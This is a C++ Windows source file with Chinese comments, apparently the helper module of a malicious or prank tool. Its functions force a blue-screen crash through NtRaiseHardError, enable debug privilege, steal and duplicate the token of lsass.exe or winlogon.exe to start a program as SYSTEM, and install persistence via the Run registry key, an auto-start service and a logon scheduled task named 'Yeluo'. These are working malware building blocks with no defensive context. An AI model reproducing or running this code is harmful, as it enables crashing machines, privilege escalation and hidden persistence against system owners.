#include"others.h"
using namespace std;
typedef /*__success(return >= 0)*/ LONG NTSTATUS;
typedef NTSTATUS* PNTSTATUS;
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef enum _HARDERROR_RESPONSE_OPTION {
	OptionAbortRetryIgnore,
	OptionOk,
	OptionOkCancel,
	OptionRetryCancel,
	OptionYesNo,
	OptionYesNoCancel,
	OptionShutdownSystem
} HARDERROR_RESPONSE_OPTION, * PHARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
	ResponseReturnToCaller,
	ResponseNotHandled,
	ResponseAbort,
	ResponseCancel,
	ResponseIgnore,
	ResponseNo,
	ResponseOk,
	ResponseRetry,
	ResponseYes
} HARDERROR_RESPONSE, * PHARDERROR_RESPONSE;
typedef UINT(CALLBACK* NTRAISEHARDERROR)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE);
typedef UINT(CALLBACK* RTLADJUSTPRIVILEGE)(ULONG, BOOL, BOOL, PINT);
/*触发蓝屏*/
void BlueScreen() {

	HINSTANCE hDLL = LoadLibrary(TEXT("ntdll.dll"));
	NTRAISEHARDERROR NtRaiseHardError;
	RTLADJUSTPRIVILEGE RtlAdjustPrivilege;
	int nEn = 0;
	HARDERROR_RESPONSE reResponse;
	if (hDLL != NULL)
	{
		NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hDLL, "NtRaiseHardError");
		RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hDLL, "RtlAdjustPrivilege");
		if (!NtRaiseHardError)
		{
			FreeLibrary(hDLL);
		}
		if (!RtlAdjustPrivilege)
		{
			FreeLibrary(hDLL);
		}
		RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);//0x13 = SeShutdownPrivilege
		NtRaiseHardError(0xC000021A, 0, 0, 0, OptionShutdownSystem, &reResponse);
	}
}
//获取调试权限
BOOL GetPrivileges()
{
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle))
	{
	//	std::cerr <<("无法打开进程令牌" )<< std::endl;
		return false;
	}
	tp.PrivilegeCount = 1;
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
	{
	//	std::cerr << "无法获取特权值" << std::endl;
		CloseHandle(hTokenHandle);
		CloseHandle(hProcess);
		return false;
	}
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL))
	{
	//	std::cerr << "无法调整特权" << std::endl;
		CloseHandle(hTokenHandle);
		CloseHandle(hProcess);
		return false;
	}
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);
	//std::cout << "获取特权成功" << std::endl;
	return true;
}
int GetProcessPermission()
{
	HANDLE hToken;
	TOKEN_ELEVATION_TYPE elevationType;
	DWORD dwSize;
	BOOL bSuccess;

	// 获取当前进程的Token句柄
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
	{
		return 1;
	}

	// 获取Token的提升类型
	bSuccess = GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(TOKEN_ELEVATION_TYPE), &dwSize);
	CloseHandle(hToken);
	if (!bSuccess)
	{
		return 1;
	}

	// 根据提升类型返回权限级别
	switch (elevationType)
	{
	case TokenElevationTypeDefault:
		return 1;
	case TokenElevationTypeLimited:
		return 2;
	case TokenElevationTypeFull:
		return 3;
	default:
		return 1;
	}
}
/*以system权限打开一个程序*/
BOOL CreateInSystem(LPWSTR processName)
{
	HANDLE hToken;
	LUID Luid;
	TOKEN_PRIVILEGES tp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Luid);
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = Luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hToken);

	// 枚举进程获取 lsass.exe 的 ID 和 winlogon.exe 
	DWORD idL{}, idW{};
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (Process32First(hSnapshot, &pe)) {
		do {
			if (0 == _stricmp(pe.szExeFile, "lsass.exe")) {
				idL = pe.th32ProcessID;
			}
			else if (0 == _stricmp(pe.szExeFile, "winlogon.exe")) {
				idW = pe.th32ProcessID;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);

	// 获取句柄，先试 lsass 再试 winlogon
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idL);
	if (!hProcess) hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, idW);
	HANDLE hTokenx;
	// 获取令牌
	OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hTokenx);
	// 复制令牌
	DuplicateTokenEx(hTokenx, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hToken);
	CloseHandle(hProcess);
	CloseHandle(hTokenx);

	// 启动信息
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(STARTUPINFOW));
	si.cb = sizeof(STARTUPINFOW);
	si.lpDesktop = (LPWSTR)L"winsta0\\default";  // 显示窗口
	// 启动进程
	BOOL result = CreateProcessWithTokenW(hToken, LOGON_NETCREDENTIALS_ONLY,
		NULL, processName, NORMAL_PRIORITY_CLASS,
		NULL, NULL, &si, &pi);
	CloseHandle(hToken);
	if (!result) {
		return false;
	}
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	return true;
}
BOOL RootKeyAddStartup(LPCTSTR lpApplicationName, LPCTSTR lpKeyName)
{
	HKEY hKey;
	LONG lResult = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	if (lResult != ERROR_SUCCESS)
	{
		return FALSE;
	}

	lResult = RegSetValueEx(hKey, lpKeyName, 0, REG_SZ, (LPBYTE)lpApplicationName, strlen(lpApplicationName));
	RegCloseKey(hKey);

	if (lResult != ERROR_SUCCESS)
	{
		return FALSE;
	}

	return TRUE;
}
BOOL ServiceAddStartup(LPCTSTR serviceName, LPCTSTR displayName, LPCTSTR binaryPath)
{
	// 打开服务控制管理器
	SC_HANDLE scmHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!scmHandle)
	{
		return FALSE;
	}

	// 创建服务
	SC_HANDLE serviceHandle = CreateService(scmHandle, serviceName, displayName,
		SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL, binaryPath, NULL, NULL, NULL, NULL, NULL);

	if (!serviceHandle)
	{
		// 如果创建服务失败，关闭服务控制管理器句柄并返回失败
		CloseServiceHandle(scmHandle);
		return FALSE;
	}

	// 关闭服务句柄和服务控制管理器句柄
	CloseServiceHandle(serviceHandle);
	CloseServiceHandle(scmHandle);

	return TRUE;
}
BOOL ITaskToStartup(const std::wstring& appPath) {
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		return false;
	}

	// 创建 ITaskService 对象
	ITaskService* pService = NULL;
	hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
	if (FAILED(hr)) {
		CoUninitialize();
		return false;
	}

	// 连接到本地计算机
	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return false;
	}

	// 获取根文件夹
	ITaskFolder* pRootFolder = NULL;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		pService->Release();
		CoUninitialize();
		return false;
	}

	// 创建任务定义
	ITaskDefinition* pTask = NULL;
	hr = pService->NewTask(0, &pTask);
	pService->Release();
	if (FAILED(hr)) {
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	// 设置任务名称和描述
	_bstr_t appPathBstr(SysAllocString(appPath.c_str()));
	pTask->put_XmlText(_bstr_t(L"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n"
		"<Triggers>\n"
		"<LogonTrigger>\n"
		"<Enabled>true</Enabled>\n"
	//	"< UserId > SYSTEM < / UserId>\n"
		"</LogonTrigger>\n"
		"</Triggers>\n"
		"<Actions>\n"
		"<Exec>\n"
		"<Command>") + appPathBstr + L"</Command>\n"
		"</Exec>\n"
		"</Actions>\n"
		"</Task>");
	// 向计划任务文件夹中添加任务
	IRegisteredTask* pRegisteredTask = NULL;
	hr = pRootFolder->RegisterTaskDefinition(_bstr_t("Yeluo"), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
	if (FAILED(hr)) {
		pTask->Release();
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	pRegisteredTask->Release();
	pTask->Release();
	pRootFolder->Release();
	CoUninitialize();
	return true;
}